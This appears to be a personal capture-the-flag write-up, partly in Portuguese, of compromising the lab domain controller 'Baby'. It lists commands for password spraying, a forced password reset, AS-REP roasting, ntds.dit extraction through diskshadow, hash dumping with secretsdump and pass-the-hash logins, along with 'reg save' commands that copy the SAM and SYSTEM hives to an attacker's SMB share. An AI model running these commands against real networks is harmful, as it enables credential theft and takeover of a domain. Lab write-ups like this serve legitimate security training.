Baby
========================

## Enumeration

![qownnotes-media-CfVduq](../../.gitbook/assets/qownnotes-media-CfVduq.png)

![qownnotes-media-DbhlUL](../../.gitbook/assets/qownnotes-media-DbhlUL.png)

SMB

![qownnotes-media-tDhTDj](../../.gitbook/assets/qownnotes-media-tDhTDj.png)

    crackmapexec smb baby.vl -u usernames.txt -p passwords.txt --shares --continue --no-bruteforce

![qownnotes-media-pfvbMV](../../.gitbook/assets/qownnotes-media-pfvbMV.png)

    crackmapexec smb baby.vl -u usernames.txt -p 'BabyStart123!' --shares --continue --no-bruteforce

![qownnotes-media-wezqbz](../../.gitbook/assets/qownnotes-media-wezqbz.png)

    impacket-smbpasswd baby.vl/Caroline.Robinson@babydc.baby.vl -newpass 'P@ssw0rd!'

![qownnotes-media-nhVTnV](../../.gitbook/assets/qownnotes-media-nhVTnV.png)

Caroline.Robinson:P@ssw0rd!

    crackmapexec smb baby.vl -u Caroline.Robinson -p 'P@ssw0rd!' --shares
    
    crackmapexec winrm baby.vl -u Caroline.Robinson -p 'P@ssw0rd!'

![qownnotes-media-FFOtcJ](../../.gitbook/assets/qownnotes-media-FFOtcJ.png)

CONSEGUIMOS SHELL

Kerberos

![qownnotes-media-oFnWQn](../../.gitbook/assets/qownnotes-media-oFnWQn.png)

    impacket-GetNPUsers -request -usersfile usernames.txt baby.vl/ -dc-ip 10.10.96.83

![qownnotes-media-bsjTBa](../../.gitbook/assets/qownnotes-media-bsjTBa.png)

DNS

![qownnotes-media-iljQQe](../../.gitbook/assets/qownnotes-media-iljQQe.png)

LDAP

    ldapsearch -x -H ldap://baby.vl -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName

    ldapsearch -x -H ldap://baby.vl -D '' -w '' -b "DC=baby,DC=vl" | grep userPrincipalName
    
![qownnotes-media-Ugemmm](../../.gitbook/assets/qownnotes-media-Ugemmm.png)

![qownnotes-media-jUfwzb](../../.gitbook/assets/qownnotes-media-jUfwzb.png)

Agora que notei a senha "BabyStart123!"

Caroline.Robinson:BabyStart123!

    cat usernames.txt > passwords.txt
    cat usernames.txt | tr '[:upper:]' '[:lower:]' >> passwords.txt

## PrivEsc


    whoami /priv

![qownnotes-media-viPDya](../../.gitbook/assets/qownnotes-media-viPDya.png)

    cat test.dsh 

```
set context persistent nowriters
add volume c: alias test
create
expose %test% z:
```

    unix2dos test.dsh

Depois disso, fazer o upload desse arquivo para a máquina alvo:

    mkdir c:\temp
    cd c:\temp
    upload test.dsh
    diskshadow /s test.dsh
    robocopy /b z:\windows\ntds . ntds.dit
    download ntds.dit

Depois de baixar o arquivo para a máquina do atacante, basta executarmos o impacket-secretsdump

    impacket-secretsdump -ntds ntds.dit -system system local

![qownnotes-media-UUMZHP](../../.gitbook/assets/qownnotes-media-UUMZHP.png)

    crackmapexec winrm baby.vl -u Administrator -H "ee4457ae59f1e3fbd764e33d9cef123d"
 
![qownnotes-media-SrXcsj](../../.gitbook/assets/qownnotes-media-SrXcsj.png)

    evil-winrm -i baby.vl -u Administrator -H "ee4457ae59f1e3fbd764e33d9cef123d"

![qownnotes-media-AizZrF](../../.gitbook/assets/qownnotes-media-AizZrF.png)

## ADD

Vale considerar que o que foi feito de maneira local não funcionou...

    reg save HKLM\SYSTEM \\10.8.1.121\smb\system
    reg save HKLM\SAM \\10.8.1.121\smb\sam
    
    impacket-secretsdump -sam sam -system system local
 
 ![qownnotes-media-SQJbKk](../../.gitbook/assets/qownnotes-media-SQJbKk.png)
 
 ![qownnotes-media-QWpHBK](../../.gitbook/assets/qownnotes-media-QWpHBK.png)